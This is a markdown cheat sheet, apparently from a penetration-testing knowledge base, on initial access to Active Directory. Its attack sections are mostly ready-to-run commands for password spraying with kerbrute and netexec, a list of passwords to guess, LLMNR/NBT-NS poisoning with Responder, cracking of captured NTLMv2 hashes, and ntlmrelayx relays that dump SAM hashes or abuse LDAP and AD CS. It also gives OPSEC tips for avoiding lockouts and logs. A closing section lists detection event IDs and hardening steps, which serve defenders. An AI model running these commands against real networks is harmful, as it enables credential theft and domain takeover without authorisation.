---
title: Active Directory Initial Access Techniques
category: techniques
subcategory: active-directory
tags: [initial-access, password-spraying, llmnr, nbt-ns, ntlm-relay, responder]
last_updated: 2025-12-27
---

# Active Directory Initial Access Techniques

## Table of Contents

- [Overview](#overview)
- [Password Spraying](#password-spraying)
- [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
- [NTLM Relay Attacks](#ntlm-relay-attacks)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Initial access in Active Directory environments typically involves obtaining valid credentials or exploiting network protocols. These techniques allow attackers to gain a foothold in the domain without requiring pre-existing access.

**Attack Categories:**
- Credential guessing (password spraying, brute force)
- Network protocol abuse (LLMNR/NBT-NS poisoning)
- Authentication relay attacks (NTLM relay)

---

## Password Spraying

### Description

Password spraying tests common passwords against many accounts simultaneously. Unlike brute forcing (many passwords against one account), spraying avoids account lockouts by staying under the lockout threshold.

### Tools

| Tool | Description |
|------|-------------|
| kerbrute | Fast Kerberos-based password spraying |
| CrackMapExec/NetExec | Multi-protocol spraying (SMB, LDAP, WinRM) |
| Spray | PowerShell-based spraying |
| DomainPasswordSpray | PowerShell AD password spraying |
| Ruler | Exchange/Outlook password spraying |

### Commands

```bash
# Kerbrute - fast Kerberos-based spraying
kerbrute passwordspray -d domain.local --dc DC_IP users.txt 'Password123!'
kerbrute passwordspray -d domain.local --dc DC_IP users.txt passwords.txt

# Enumerate valid users first
kerbrute userenum -d domain.local --dc DC_IP users.txt

# NetExec (formerly CrackMapExec) - SMB
netexec smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success
netexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# NetExec - LDAP
netexec ldap DC_IP -u users.txt -p 'Password1' --continue-on-success

# NetExec - WinRM
netexec winrm DC_IP -u users.txt -p 'Welcome1!' --continue-on-success

# Spray using Kerberos pre-auth (stealthier)
netexec smb DC_IP -u users.txt -p 'Company2024' -k --continue-on-success
```

```powershell
# DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1

# Spray single password
Invoke-DomainPasswordSpray -Password 'Winter2024!' -OutFile spray_results.txt

# With user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password123' -OutFile results.txt

# Using password policy to avoid lockouts
Invoke-DomainPasswordSpray -Password 'Summer2024!' -Force
```

### Common Passwords to Try

```
Season + Year: Spring2024!, Summer2024!, Winter2024!
Company + Year: CompanyName2024!
Welcome1, Welcome123, Password1, Password123
Month + Year: January2024!, December2024!
```

### OPSEC Considerations

- Query password policy first: `net accounts /domain`
- Stay under lockout threshold (typically 3-5 attempts)
- Space attempts by observation window (typically 30 minutes)
- Kerberos-based spraying generates fewer logs than SMB

---

## LLMNR/NBT-NS Poisoning

### Description

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are fallback name resolution protocols. When DNS fails, Windows queries these protocols, allowing attackers to respond and capture authentication attempts.

### How It Works

1. Victim tries to access `\\fileserver\share`
2. DNS lookup fails (typo, server down, etc.)
3. Windows broadcasts LLMNR/NBT-NS query
4. Attacker responds: "I am fileserver"
5. Victim authenticates to attacker
6. Attacker captures NTLMv2 hash

### Tools

| Tool | Description |
|------|-------------|
| Responder | LLMNR/NBT-NS/mDNS poisoner with rogue servers |
| Inveigh | PowerShell-based alternative |
| mitm6 | IPv6 DNS poisoning |

### Responder Commands

```bash
# Basic poisoning
sudo responder -I eth0

# With WPAD proxy (highly effective - captures browser creds)
sudo responder -I eth0 -wPv

# Analyze mode (passive recon, no poisoning)
sudo responder -I eth0 -A

# Force NTLM auth on WPAD
sudo responder -I eth0 -wFPv

# All interfaces
sudo responder -I ALL

# Disable specific servers if needed
sudo responder -I eth0 --disable-ess  # Disable Extended Session Security
```

### Captured Hash Locations

```
logs/SMB-NTLMv2-Client-<IP>.txt
logs/HTTP-NTLMv2-Client-<IP>.txt
logs/Responder-Session.log
```

### Cracking Captured Hashes

```bash
# NTLMv2 with Hashcat (mode 5600)
hashcat -m 5600 captured_hash.txt wordlist.txt

# NTLMv1 with Hashcat (mode 5500)
hashcat -m 5500 ntlmv1_hash.txt wordlist.txt

# Using John
john --format=netntlmv2 captured_hash.txt --wordlist=wordlist.txt
```

### Inveigh (PowerShell Alternative)

```powershell
# Import module
Import-Module .\Inveigh.ps1

# Start poisoning
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y

# Check captured hashes
Get-Inveigh
```

---

## NTLM Relay Attacks

### Description

Instead of cracking captured hashes, NTLM relay forwards authentication to another service, gaining access as the victim. This is highly effective against systems without SMB signing.

### Prerequisites

- Target systems must have SMB signing disabled (or not required)
- Attacker must be in man-in-the-middle position
- Cannot relay authentication back to the source

### Attack Flow

1. Trigger victim to authenticate (LLMNR/NBT-NS, file share, email)
2. Capture NTLM authentication
3. Relay to target system (different from source)
4. Execute commands as victim on target

### Finding Relay Targets

```bash
# Find systems without SMB signing required
netexec smb target_range -u '' -p '' --gen-relay-list relay_targets.txt

# Nmap check
nmap -p445 --script smb-security-mode target_range

# CrackMapExec check
crackmapexec smb target_range --gen-relay-list targets.txt
```

### ntlmrelayx.py Commands

```bash
# Basic relay (interactive SMB shell)
ntlmrelayx.py -tf targets.txt -smb2support

# Execute command on relay
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (for RBCD attack)
ntlmrelayx.py -t ldaps://DC_IP --remove-mic --add-computer ATTACKER$ --delegate-access

# Relay to LDAP for shadow credentials
ntlmrelayx.py -t ldaps://DC_IP --shadow-credentials --shadow-target TARGET$

# Relay to AD CS web enrollment (ESC8)
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# SOCKS proxy for interactive relay
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### Combine with Responder

```bash
# Terminal 1: Disable Responder's SMB/HTTP servers
# Edit Responder.conf: SMB = Off, HTTP = Off
sudo responder -I eth0

# Terminal 2: Run ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
```

### mitm6 + ntlmrelayx

```bash
# Terminal 1: IPv6 DNS poisoning
sudo mitm6 -d domain.local

# Terminal 2: Relay to LDAP
ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker-wpad --delegate-access
```

### MultiRelay (Built into Responder)

```bash
# Relay captured auth to specific target
python3 MultiRelay.py -t TARGET_IP -u ALL
```

---

## Detection and Defense

### Detection

| Attack | Detection Methods |
|--------|------------------|
| Password Spraying | Event ID 4625 (failed logon), 4771 (Kerberos pre-auth failure) |
| LLMNR/NBT-NS Poisoning | Monitor UDP 5355/137, unusual LLMNR/NBT-NS responses |
| NTLM Relay | Event ID 4624 Type 3 from unexpected sources, SMB traffic patterns |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4625 | Failed logon attempt |
| 4771 | Kerberos pre-authentication failure |
| 4776 | NTLM authentication failure |
| 4624 | Successful logon (check Type 3 network logons) |
| 4697 | Service installation (relay attack indicators) |

### Defensive Measures

**Password Spraying:**
- Implement smart lockout policies
- Require MFA for external access
- Monitor authentication patterns
- Use Azure AD Password Protection

**LLMNR/NBT-NS:**
```
# Disable LLMNR via GPO
Computer Configuration > Administrative Templates > Network > DNS Client
  Turn off multicast name resolution = Enabled

# Disable NBT-NS via registry
HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\*
  NetbiosOptions = 2
```

**NTLM Relay:**
- Enable SMB signing on all systems (required, not just enabled)
- Enable LDAP signing and channel binding
- Disable NTLM where possible (use Kerberos)
- Enable Extended Protection for Authentication (EPA)
- Use Protected Users group for privileged accounts

```powershell
# Enable SMB signing via GPO
Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
  Microsoft network client: Digitally sign communications (always) = Enabled
  Microsoft network server: Digitally sign communications (always) = Enabled
```

---

## References

- [MITRE ATT&CK - LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1557/001/)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [Cobalt - LLMNR Poisoning and NTLM Relay](https://www.cobalt.io/blog/llmnr-poisoning-ntlm-relay)
- [HackTricks - NTLM Relay](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay)
- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
